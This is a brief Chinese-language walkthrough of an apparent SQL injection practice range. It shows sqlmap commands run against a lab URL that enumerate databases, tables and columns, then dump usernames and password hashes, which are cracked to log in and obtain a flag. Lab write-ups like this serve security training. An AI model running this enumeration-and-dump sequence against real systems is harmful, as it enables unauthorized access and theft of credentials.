![1617938434_606fc8028fd845a0831a1.png!small](https://image.3001.net/images/20210409/1617938434_606fc8028fd845a0831a1.png!small)

1.打开靶场，看到此处（主要是针对SQL注入，所有直接找注入点，登录先不看）

![1617938464_606fc820493a7e4acaa4b.png!small](https://image.3001.net/images/20210409/1617938464_606fc820493a7e4acaa4b.png!small)

2.看到了平台停机维护，看到URL的参数id，下意识以为找到位置了

![1617938527_606fc85f517d45f28e88a.png!small](https://image.3001.net/images/20210409/1617938527_606fc85f517d45f28e88a.png!small)

3.放到神器sqlmap跑一下看看，发现目标！

![1617938588_606fc89cbe030703f6f07.png!small](https://image.3001.net/images/20210409/1617938588_606fc89cbe030703f6f07.png!small)

4.继续爆破数据库、表、用户名密码

sqlmap.py -u http://219.153.49.228:42711/new_list.php?id=1 --dbs

![1617938629_606fc8c507cc565e9f7fb.png!small](https://image.3001.net/images/20210409/1617938629_606fc8c507cc565e9f7fb.png!small)

sqlmap.py -u http://219.153.49.228:42711/new_list.php?id=1 -D stormgroup
--tables

![1617938638_606fc8cea8bb848f08059.png!small](https://image.3001.net/images/20210409/1617938638_606fc8cea8bb848f08059.png!small)

sqlmap.py -u http://219.153.49.228:42711/new_list.php?id=1 -D stormgroup -T
member --columns

![1617938647_606fc8d7e8447b2c03a64.png!small](https://image.3001.net/images/20210409/1617938647_606fc8d7e8447b2c03a64.png!small)

sqlmap.py -u http://219.153.49.228:42711/new_list.php?id=1 -D stormgroup -T
member -C name,password --dump

![1617938657_606fc8e18fdf891a8139e.png!small](https://image.3001.net/images/20210409/1617938657_606fc8e18fdf891a8139e.png!small)

5.获取密码后，发现是md5加密，进行解密后发现第二账号可以登录，登录后即可看到KEY

![1617938667_606fc8eb6bb83eaa159c8.png!small](https://image.3001.net/images/20210409/1617938667_606fc8eb6bb83eaa159c8.png!small)

